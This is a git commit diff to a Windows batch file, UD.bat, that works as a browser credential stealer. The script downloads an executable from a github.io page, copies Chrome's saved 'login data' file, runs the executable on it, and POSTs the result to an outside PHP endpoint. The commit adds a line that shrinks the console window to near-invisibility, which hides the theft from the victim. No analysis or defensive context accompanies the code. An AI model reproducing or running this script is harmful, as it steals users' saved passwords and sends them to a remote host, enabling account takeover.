fb10f3f18e1efd121f15762cd9d80e99be6c1187
Redcoconut <33994906+Redcoconut@users.noreply.github.com>
2018-05-01 22:51:33 +1000

    make small

--- UD.bat
+++ UD.bat
@@ -1,4 +1,6 @@
+mode con: cols=15 lines=1
 powershell "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"; "Invoke-WebRequest -Uri https://redcoconut.github.io/Redc/CD.exe -OutFile $env:temp/CD.exe -UseBasicParsing"
 cd C:\Users\%Username%\AppData\Local\Temp
 
 powershell "Copy-Item -Path \"C:\Users\$env:username\AppData\Local\Google\Chrome\User Data\Default\login data\" -Destination \"$env:temp\""; "rename-item -path \"$env:temp/login data\" -newname \"alakazam\""; "$One = cmd /c 'CD.exe alakazam'"; "$One = [string]::join(\"ENTERR\",($One.Split(\"`n\")))"; "$content = "$One""; "$URI = 'http://red.scienceontheweb.net/filetest.php'"; "$Body ='name=' + $content + '&B1=SUBMIT%21'"; "$page = Invoke-WebRequest $URI -body $Body -method POST" 
+exit
